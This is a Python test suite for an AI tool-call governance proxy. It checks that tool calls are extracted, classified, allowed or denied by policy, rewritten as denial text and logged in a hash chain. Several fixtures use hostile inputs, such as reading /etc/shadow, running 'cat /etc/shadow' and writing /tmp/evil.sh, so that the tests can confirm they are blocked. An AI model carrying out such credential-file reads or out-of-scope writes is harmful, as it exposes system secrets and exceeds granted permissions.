#!/usr/bin/env python3
"""
test_api_proxy.py — Tests for the Atested API governance proxy.

Tests cover:
- Non-streaming response governance (tool_use extraction, allow, deny)
- Streaming SSE response governance (tool_use buffering, allow, deny)
- Classification integration (classifier + policy evaluator)
- Chain recording (decisions written to chain)
- Response modification (denied tool_use replaced with text)
- Pass-through for non-messages endpoints
"""

import asyncio
import json
import os
import sys
import unittest
from pathlib import Path
from typing import Any, Optional
from unittest.mock import AsyncMock, MagicMock, patch

REPO = Path(__file__).resolve().parents[1]
PROXY_DIR = REPO / "proxy"
SCRIPTS = REPO / "scripts"
MCP_DIR = REPO / "mcp"
for p in (PROXY_DIR, SCRIPTS, MCP_DIR):
    if str(p) not in sys.path:
        sys.path.insert(0, str(p))

from proxy.server import (
    ChainRecorder,
    GovernanceProxy,
    StreamingToolCollector,
    extract_tool_use_blocks,
    mediate_decision,
    replace_tool_use_with_denial,
)
import proxy.server as proxy_server
from proxy.providers.openai import OpenAIProvider
from classifier import classify
from policy_eval_v2 import load_policy_rules

_REPO_STR = str(REPO)
_POLICY = load_policy_rules()


def _make_policy(base_dirs=None):
    p = dict(_POLICY)
    p["base_dirs"] = base_dirs or [_REPO_STR]
    return p


def _run(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# ===================================================================
# Tool use extraction
# ===================================================================

class TestExtractToolUseBlocks(unittest.TestCase):
    """Extract tool_use blocks from Messages API response content."""

    def test_empty_content(self):
        self.assertEqual(extract_tool_use_blocks([]), [])

    def test_text_only(self):
        content = [{"type": "text", "text": "Hello"}]
        self.assertEqual(extract_tool_use_blocks(content), [])

    def test_single_tool_use(self):
        content = [
            {"type": "text", "text": "Let me read that file."},
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": "/tmp/test.txt"}},
        ]
        blocks = extract_tool_use_blocks(content)
        self.assertEqual(len(blocks), 1)
        self.assertEqual(blocks[0]["name"], "Read")

    def test_multiple_tool_use(self):
        content = [
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": "/tmp/a.txt"}},
            {"type": "tool_use", "id": "t2", "name": "Write",
             "input": {"file_path": "/tmp/b.txt", "content": "hello"}},
        ]
        blocks = extract_tool_use_blocks(content)
        self.assertEqual(len(blocks), 2)


# ===================================================================
# Denial replacement
# ===================================================================

class TestReplaceDenial(unittest.TestCase):
    """Replace tool_use blocks with denial text."""

    def test_replace_single_tool(self):
        content = [
            {"type": "text", "text": "I'll read that."},
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": "/etc/shadow"}},
        ]
        result = replace_tool_use_with_denial(
            content, "t1", "Read", "sensitive path", "deny-sensitive"
        )
        self.assertEqual(len(result), 2)
        self.assertEqual(result[0]["type"], "text")
        self.assertEqual(result[1]["type"], "text")
        self.assertIn("Governance", result[1]["text"])
        self.assertIn("Read", result[1]["text"])
        self.assertIn("sensitive path", result[1]["text"])

    def test_replace_preserves_other_blocks(self):
        content = [
            {"type": "tool_use", "id": "t1", "name": "Read",
             "input": {"file_path": os.path.join(_REPO_STR, "README.md")}},
            {"type": "tool_use", "id": "t2", "name": "Read",
             "input": {"file_path": "/etc/shadow"}},
        ]
        result = replace_tool_use_with_denial(
            content, "t2", "Read", "denied", "rule"
        )
        self.assertEqual(result[0]["type"], "tool_use")
        self.assertEqual(result[1]["type"], "text")


# ===================================================================
# Mediation decision (classify → evaluate → record)
# ===================================================================

class TestMediateDecision(unittest.TestCase):
    """Decision-only mediation without execution."""

    def test_allow_read_within_repo(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "ALLOW")
        self.assertEqual(record["record_version"], "2.0")
        self.assertEqual(record["record_type"], "mediated_decision")

    def test_deny_sensitive_path(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": "/etc/shadow"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")

    def test_deny_write_outside_repo(self):
        policy = _make_policy()
        record = mediate_decision(
            "Write", {"file_path": "/tmp/evil.sh", "content": "#!/bin/bash"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "DENY")

    def test_allow_write_within_repo(self):
        policy = _make_policy()
        record = mediate_decision(
            "Write", {"file_path": os.path.join(_REPO_STR, "test.txt"),
                      "content": "hello"},
            policy=policy,
        )
        self.assertEqual(record["policy_decision"], "ALLOW")

    def test_classification_metadata_present(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy,
        )
        cls = record["classification"]
        self.assertEqual(cls["action_type"], "read")
        self.assertIn(cls["confidence_tier"], [1, 2])
        self.assertIn("targets", cls)

    def test_chain_recording(self):
        policy = _make_policy()
        recorder = ChainRecorder(Path("/tmp/claude/test_proxy_chain.jsonl"))
        # Clean up
        recorder._chain_path.unlink(missing_ok=True)

        mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy, chain_recorder=recorder,
        )
        mediate_decision(
            "Read", {"file_path": "/etc/shadow"},
            policy=policy, chain_recorder=recorder,
        )

        lines = recorder._chain_path.read_text().strip().split("\n")
        self.assertEqual(len(lines), 2)
        r1 = json.loads(lines[0])
        r2 = json.loads(lines[1])
        self.assertEqual(r1["policy_decision"], "ALLOW")
        self.assertEqual(r2["policy_decision"], "DENY")
        # Chain linkage
        self.assertEqual(r2["prev_record_hash"], r1["record_hash"])

        recorder._chain_path.unlink(missing_ok=True)

    def test_user_identity_recorded(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy, user_identity="test-user",
        )
        self.assertEqual(record["user_identity"], "test-user")

    def test_session_id_recorded(self):
        policy = _make_policy()
        record = mediate_decision(
            "Read", {"file_path": os.path.join(_REPO_STR, "README.md")},
            policy=policy, session_id="sess-123",
        )
        self.assertEqual(record["session_id"], "sess-123")


# ===================================================================
# Claude Code native tool classification
# ===================================================================

class TestNativeToolClassification(unittest.TestCase):
    """Classify Claude Code's native tools correctly."""

    def test_read_tool(self):
        cls = classify("Read", {"file_path": "/tmp/test.txt"})
        self.assertEqual(cls["action_type"], "read")
        self.assertEqual(cls["confidence_tier"], 1)

    def test_write_tool(self):
        cls = classify("Write", {"file_path": "/tmp/test.txt", "content": "x"})
        self.assertEqual(cls["action_type"], "write")
        self.assertEqual(cls["confidence_tier"], 1)

    def test_edit_tool(self):
        cls = classify("Edit", {"file_path": "/tmp/test.txt",
                                "old_string": "a", "new_string": "b"})
        self.assertEqual(cls["action_type"], "write")
        self.assertEqual(cls["confidence_tier"], 1)

    def test_bash_tool(self):
        cls = classify("Bash", {"command": "ls -la"})
        # Bash commands are at least tier 2 (inferred) or tier 3 (opaque)
        self.assertIn(cls["confidence_tier"], [2, 3])
        self.assertEqual(cls["action_type"], "execute")

    def test_bash_tool_sensitive(self):
        cls = classify("Bash", {"command": "cat /etc/shadow"})
        # The classifier sees this as an execute with /etc/shadow as a target
        # Classifier includes full command as target; verify the sensitive path is referenced
        self.assertTrue(
            any("/etc/shadow" in t for t in cls["targets"]),
            f"Expected /etc/shadow referenced in targets, got {cls['targets']}",
        )

    def test_glob_tool(self):
        cls = classify("Glob", {"pattern": "*.py", "path": "/tmp"})
        self.assertEqual(cls["action_type"], "list")

    def test_grep_tool(self):
        cls = classify("Grep", {"pattern": "TODO", "path": "/tmp"})
        # Grep may classify as read or list depending on evidence
        self.assertIn(cls["action_type"], ["read", "list"])


# ===================================================================
# Streaming tool collector
# ===================================================================

class TestStreamingToolCollector(unittest.TestCase):
    """Streaming SSE tool_use block collection and governance."""

    def _make_collector(self, base_dirs=None):
        policy = _make_policy(base_dirs or [_REPO_STR])
        return StreamingToolCollector(policy, None)

    def test_text_block_passes_through(self):
        collector = self._make_collector()
        action = collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "text", "text": ""},
        })
        self.assertEqual(action, "pass")

    def test_tool_use_start_buffers(self):
        collector = self._make_collector()
        action = collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {
                "type": "tool_use",
                "id": "t1",
                "name": "Read",
                "input": {},
            },
        })
        self.assertEqual(action, "buffer")

    def test_tool_use_delta_buffers(self):
        collector = self._make_collector()
        # Start
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Delta
        action = collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {
                "type": "input_json_delta",
                "partial_json": '{"file_path": "',
            },
        })
        self.assertEqual(action, "buffer")

    def test_allowed_tool_passes_on_stop(self):
        collector = self._make_collector()
        # Start
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Delta with path inside repo
        path = os.path.join(_REPO_STR, "README.md")
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {
                "type": "input_json_delta",
                "partial_json": json.dumps({"file_path": path}),
            },
        })
        # Stop
        action = collector.process_event("content_block_stop", {
            "type": "content_block_stop",
            "index": 0,
        })
        self.assertEqual(action, "pass")
        self.assertFalse(collector.is_denied(0))

    def test_denied_tool_replaces_on_stop(self):
        collector = self._make_collector()
        # Start
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Delta with sensitive path
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {
                "type": "input_json_delta",
                "partial_json": '{"file_path": "/etc/shadow"}',
            },
        })
        # Stop
        action = collector.process_event("content_block_stop", {
            "type": "content_block_stop",
            "index": 0,
        })
        self.assertEqual(action, "replace")
        self.assertTrue(collector.is_denied(0))

    def test_denied_tool_has_replacement_events(self):
        collector = self._make_collector()
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {"type": "input_json_delta", "partial_json": '{"file_path": "/etc/shadow"}'},
        })
        collector.process_event("content_block_stop", {
            "type": "content_block_stop", "index": 0,
        })

        events = collector.get_replacement_events(0)
        self.assertTrue(len(events) >= 3)  # start, delta, stop

        # Parse the events
        all_text = b"".join(events).decode()
        self.assertIn("content_block_start", all_text)
        self.assertIn("content_block_delta", all_text)
        self.assertIn("content_block_stop", all_text)
        self.assertIn("Governance", all_text)
        self.assertIn("denied", all_text.lower())

    def test_decision_record_available(self):
        collector = self._make_collector()
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        collector.process_event("content_block_delta", {
            "type": "content_block_delta",
            "index": 0,
            "delta": {"type": "input_json_delta",
                      "partial_json": json.dumps({"file_path": os.path.join(_REPO_STR, "README.md")})},
        })
        collector.process_event("content_block_stop", {
            "type": "content_block_stop", "index": 0,
        })

        decision = collector.get_decision(0)
        self.assertIsNotNone(decision)
        self.assertEqual(decision["policy_decision"], "ALLOW")
        self.assertEqual(decision["record_version"], "2.0")

    def test_multi_fragment_json_reassembly(self):
        """Tool input JSON arrives in multiple delta events."""
        collector = self._make_collector()
        collector.process_event("content_block_start", {
            "type": "content_block_start",
            "index": 0,
            "content_block": {"type": "tool_use", "id": "t1", "name": "Read", "input": {}},
        })
        # Split the JSON across multiple deltas
        path = os.path.join(_REPO_STR, "README.md")
        full_json = json.dumps({"file_path": path})
        mid = len(full_json) // 2

        collector.process_event("content_block_delta", {
            "type": "content_block_delta", "index": 0,
            "delta": {"type": "input_json_delta", "partial_json": full_json[:mid]},
        })
        collector.process_event("content_block_delta", {
            "type": "content_block_delta", "index": 0,
            "delta": {"type": "input_json_delta", "partial_json": full_json[mid:]},
        })
        collector.process_event("content_block_stop", {
            "type": "content_block_stop", "index": 0,
        })

        decision = collector.get_decision(0)
        self.assertEqual(decision["policy_decision"], "ALLOW")


# ===================================================================
# Non-streaming proxy handler
# ===================================================================

class TestNonStreamingProxy(unittest.TestCase):
    """GovernanceProxy handling of non-streaming Messages API responses."""

    def _make_proxy(self, base_dirs=None):
        policy = _make_policy(base_dirs or [_REPO_STR])
        return GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=policy,
        )

    def test_allow_preserves_response(self):
        proxy = self._make_proxy()
        path = os.path.join(_REPO_STR, "README.md")

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": path}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        self.assertEqual(status, 200)
        data = json.loads(body)
        self.assertEqual(data["content"][0]["type"], "tool_use")
        self.assertEqual(data["stop_reason"], "tool_use")

    def test_forwarded_buffered_response_strips_content_encoding(self):
        proxy = self._make_proxy()
        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [{"type": "text", "text": "ok"}],
            "stop_reason": "end_turn",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {
                "content-type": "application/json",
                "content-encoding": "gzip",
                "content-length": "999",
            }
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        self.assertEqual(status, 200)
        normalized = {k.lower(): v for k, v in headers.items()}
        self.assertNotIn("content-encoding", normalized)
        self.assertEqual(normalized["content-length"], str(len(body)))

    def test_deny_replaces_tool_use(self):
        proxy = self._make_proxy()

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "text", "text": "Let me read that file."},
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": "/etc/shadow"}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        data = json.loads(body)
        # tool_use should be replaced with text
        tool_blocks = [b for b in data["content"] if b["type"] == "tool_use"]
        text_blocks = [b for b in data["content"] if b["type"] == "text"]
        self.assertEqual(len(tool_blocks), 0)
        self.assertEqual(len(text_blocks), 2)  # original + denial
        self.assertIn("Governance", text_blocks[1]["text"])
        # stop_reason should change since no tool_use blocks remain
        self.assertEqual(data["stop_reason"], "end_turn")

    def test_mixed_allow_deny(self):
        """One tool allowed, one denied in the same response."""
        proxy = self._make_proxy()
        path = os.path.join(_REPO_STR, "README.md")

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": path}},
                {"type": "tool_use", "id": "t2", "name": "Read",
                 "input": {"file_path": "/etc/shadow"}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, headers, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        data = json.loads(body)
        tool_blocks = [b for b in data["content"] if b["type"] == "tool_use"]
        text_blocks = [b for b in data["content"] if b["type"] == "text"]
        self.assertEqual(len(tool_blocks), 1)  # allowed one remains
        self.assertEqual(tool_blocks[0]["id"], "t1")
        self.assertEqual(len(text_blocks), 1)  # denial text
        # stop_reason stays tool_use since one tool remains
        self.assertEqual(data["stop_reason"], "tool_use")

    def test_non_messages_endpoint_passthrough(self):
        """Non-messages endpoints are forwarded without governance."""
        proxy = self._make_proxy()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = b'{"models": []}'
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, _, body = _run(proxy.handle_request(
                "GET", "/v1/models", {}, b"",
            ))

        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body), {"models": []})

    def test_text_only_response_passthrough(self):
        """Response with no tool_use blocks passes through unchanged."""
        proxy = self._make_proxy()

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [{"type": "text", "text": "Hello!"}],
            "stop_reason": "end_turn",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, _, body = _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        data = json.loads(body)
        self.assertEqual(data["content"][0]["text"], "Hello!")

    def test_chain_recording_through_proxy(self):
        """Proxy records decisions in the governance chain."""
        chain_path = Path("/tmp/claude/test_proxy_chain_handler.jsonl")
        chain_path.unlink(missing_ok=True)
        recorder = ChainRecorder(chain_path)

        proxy = GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=_make_policy(),
            chain_recorder=recorder,
        )

        response_body = json.dumps({
            "id": "msg_1",
            "type": "message",
            "role": "assistant",
            "content": [
                {"type": "tool_use", "id": "t1", "name": "Read",
                 "input": {"file_path": os.path.join(_REPO_STR, "README.md")}},
                {"type": "tool_use", "id": "t2", "name": "Read",
                 "input": {"file_path": "/etc/shadow"}},
            ],
            "stop_reason": "tool_use",
        }).encode()

        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            _run(proxy.handle_request(
                "POST", "/v1/messages", {"content-type": "application/json"},
                json.dumps({"messages": [], "stream": False}).encode(),
            ))

        lines = chain_path.read_text().strip().split("\n")
        self.assertEqual(len(lines), 2)
        r1 = json.loads(lines[0])
        r2 = json.loads(lines[1])
        self.assertEqual(r1["policy_decision"], "ALLOW")
        self.assertEqual(r2["policy_decision"], "DENY")
        self.assertEqual(r2["prev_record_hash"], r1["record_hash"])

        chain_path.unlink(missing_ok=True)


# ===================================================================
# QS-052 trust posture and Responses API mediation
# ===================================================================


class TestQS052ProxyPosture(unittest.TestCase):
    def _capability_registry(self, mode: str) -> Path:
        path = Path(os.environ.get("TMPDIR", "/private/tmp")) / f"qs052-capability-{mode}.json"
        path.write_text(json.dumps({
            "version": "0.1",
            "governance_posture": {"mode": mode},
            "tools": [],
        }), encoding="utf-8")
        return path

    def _proxy_with_chain(self, chain_name: str) -> tuple[GovernanceProxy, Path]:
        chain_path = Path(os.environ.get("TMPDIR", "/private/tmp")) / chain_name
        chain_path.unlink(missing_ok=True)
        recorder = ChainRecorder(chain_path)
        proxy = GovernanceProxy(
            upstream_base="http://fake-api.test",
            policy=_make_policy(),
            chain_recorder=recorder,
        )
        return proxy, chain_path

    def test_openai_responses_tool_call_is_mediated(self):
        proxy, chain_path = self._proxy_with_chain("qs052-responses-mediated.jsonl")
        response_body = json.dumps({
            "id": "resp_1",
            "object": "response",
            "output": [{
                "type": "function_call",
                "id": "fc_1",
                "call_id": "call_1",
                "name": "Read",
                "arguments": json.dumps({"file_path": os.path.join(_REPO_STR, "README.md")}),
            }],
        }).encode()
        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client

            status, _, body = _run(proxy.handle_request(
                "POST", "/v1/responses", {"content-type": "application/json"},
                json.dumps({"input": [], "stream": False}).encode(),
                provider=OpenAIProvider(),
            ))

        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body)["output"][0]["type"], "function_call")
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["record_type"], "mediated_decision")
        self.assertEqual(rows[0]["provider"], "openai")
        self.assertEqual(rows[0]["policy_decision"], "ALLOW")
        self.assertNotIn("developer_mode", rows[0])
        chain_path.unlink(missing_ok=True)

    def test_openai_responses_denial_rewrites_output(self):
        proxy, chain_path = self._proxy_with_chain("qs052-responses-deny.jsonl")
        response_body = json.dumps({
            "id": "resp_1",
            "output": [{
                "type": "function_call",
                "id": "fc_1",
                "call_id": "call_1",
                "name": "Read",
                "arguments": '{"file_path": "/etc/shadow"}',
            }],
        }).encode()
        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = response_body
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client
            status, _, body = _run(proxy.handle_request(
                "POST", "/v1/responses", {"content-type": "application/json"},
                json.dumps({"input": []}).encode(),
                provider=OpenAIProvider(),
            ))
        self.assertEqual(status, 200)
        output = json.loads(body)["output"]
        self.assertEqual(output[0]["type"], "message")
        self.assertIn("[Governance] Operation denied", output[0]["content"][0]["text"])
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(rows[0]["policy_decision"], "DENY")
        self.assertEqual(rows[0]["provider"], "openai")
        chain_path.unlink(missing_ok=True)

    def test_production_blocks_unrecognized_tool_response(self):
        proxy, chain_path = self._proxy_with_chain("qs052-prod-block.jsonl")
        with patch.object(proxy_server, "CAP_REGISTRY_PATH", self._capability_registry("production")):
            with patch("httpx.AsyncClient") as MockClient:
                mock_resp = MagicMock()
                mock_resp.status_code = 200
                mock_resp.headers = {"content-type": "application/json"}
                mock_resp.content = b'{"unexpected": true}'
                mock_client = AsyncMock()
                mock_client.request = AsyncMock(return_value=mock_resp)
                mock_client.__aenter__ = AsyncMock(return_value=mock_client)
                mock_client.__aexit__ = AsyncMock(return_value=False)
                MockClient.return_value = mock_client
                status, _, body = _run(proxy.handle_request(
                    "POST", "/v1/responses", {"content-type": "application/json"},
                    json.dumps({"input": []}).encode(),
                    provider=OpenAIProvider(),
                ))
        self.assertEqual(status, 502)
        self.assertEqual(json.loads(body)["condition_source"], "unsupported_provider_format")
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["event_type"], "governance_integrity_error")
        self.assertEqual(rows[0]["provider"], "openai")
        self.assertNotIn("developer_mode", rows[0])
        chain_path.unlink(missing_ok=True)

    def test_developer_mode_forwards_unrecognized_and_watermarks_record(self):
        proxy, chain_path = self._proxy_with_chain("qs052-dev-forward.jsonl")
        with patch.object(proxy_server, "CAP_REGISTRY_PATH", self._capability_registry("developer")):
            with patch("httpx.AsyncClient") as MockClient:
                mock_resp = MagicMock()
                mock_resp.status_code = 200
                mock_resp.headers = {"content-type": "application/json"}
                mock_resp.content = b'{"unexpected": true}'
                mock_client = AsyncMock()
                mock_client.request = AsyncMock(return_value=mock_resp)
                mock_client.__aenter__ = AsyncMock(return_value=mock_client)
                mock_client.__aexit__ = AsyncMock(return_value=False)
                MockClient.return_value = mock_client
                status, _, body = _run(proxy.handle_request(
                    "POST", "/v1/responses", {"content-type": "application/json"},
                    json.dumps({"input": []}).encode(),
                    provider=OpenAIProvider(),
                ))
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body), {"unexpected": True})
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["event_type"], "proxy_request_observed")
        self.assertEqual(rows[0]["provider"], "openai")
        self.assertTrue(rows[0]["developer_mode"])
        self.assertFalse(rows[0]["examined"])
        chain_path.unlink(missing_ok=True)

    def test_developer_mode_watermarks_examined_mediated_record(self):
        proxy, chain_path = self._proxy_with_chain("qs052-dev-mediated.jsonl")
        response_body = json.dumps({
            "id": "resp_1",
            "output": [{
                "type": "function_call",
                "id": "fc_1",
                "call_id": "call_1",
                "name": "Read",
                "arguments": json.dumps({"file_path": os.path.join(_REPO_STR, "README.md")}),
            }],
        }).encode()
        with patch.object(proxy_server, "CAP_REGISTRY_PATH", self._capability_registry("developer")):
            with patch("httpx.AsyncClient") as MockClient:
                mock_resp = MagicMock()
                mock_resp.status_code = 200
                mock_resp.headers = {"content-type": "application/json"}
                mock_resp.content = response_body
                mock_client = AsyncMock()
                mock_client.request = AsyncMock(return_value=mock_resp)
                mock_client.__aenter__ = AsyncMock(return_value=mock_client)
                mock_client.__aexit__ = AsyncMock(return_value=False)
                MockClient.return_value = mock_client
                status, _, _ = _run(proxy.handle_request(
                    "POST", "/v1/responses", {"content-type": "application/json"},
                    json.dumps({"input": []}).encode(),
                    provider=OpenAIProvider(),
                ))
        self.assertEqual(status, 200)
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(rows[0]["record_type"], "mediated_decision")
        self.assertEqual(rows[0]["provider"], "openai")
        self.assertTrue(rows[0]["developer_mode"])
        chain_path.unlink(missing_ok=True)

    def test_non_tool_request_is_observed_once(self):
        proxy, chain_path = self._proxy_with_chain("qs052-non-tool-observed.jsonl")
        with patch("httpx.AsyncClient") as MockClient:
            mock_resp = MagicMock()
            mock_resp.status_code = 200
            mock_resp.headers = {"content-type": "application/json"}
            mock_resp.content = b'{"object": "list", "data": []}'
            mock_client = AsyncMock()
            mock_client.request = AsyncMock(return_value=mock_resp)
            mock_client.__aenter__ = AsyncMock(return_value=mock_client)
            mock_client.__aexit__ = AsyncMock(return_value=False)
            MockClient.return_value = mock_client
            status, _, body = _run(proxy.handle_request(
                "GET", "/v1/models", {"content-type": "application/json"},
                b"",
                provider=OpenAIProvider(),
            ))
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body), {"object": "list", "data": []})
        rows = [json.loads(line) for line in chain_path.read_text().splitlines() if line.strip()]
        self.assertEqual(len(rows), 1)
        self.assertEqual(rows[0]["event_type"], "proxy_request_observed")
        self.assertEqual(rows[0]["provider"], "openai")
        self.assertEqual(rows[0]["method"], "GET")
        self.assertFalse(rows[0]["tool_endpoint"])
        self.assertTrue(rows[0]["forwarded"])
        self.assertNotIn("developer_mode", rows[0])
        chain_path.unlink(missing_ok=True)

    # QS-053: every request through the proxy produces a chain record, including
    # streaming Anthropic responses that carry no tool_use blocks. Before the
    # repair the streaming handlers only recorded mediated tool calls, so a
    # text-only stream left no governed record at all.
    _TEXT_ONLY_SSE = "\r\n".join([
        "event: message_start",
        'data: {"type":"message_start","message":{"id":"msg_x","role":"assistant","content":[]}}',
        "",
        "event: content_block_start",
        'data: {"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}',
        "",
        "event: content_block_delta",
        'data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hi."}}',
        "",
        "event: content_block_stop",
        'data: {"type":"content_block_stop","index":0}',
        "",
        "event: message_delta",
        'data: {"type":"message_delta","delta":{"stop_reason":"end_turn"}}',
        "",
        "event: message_stop",
        'data: {"type":"message_stop"}',
        "",
    ]).encode("utf-8")

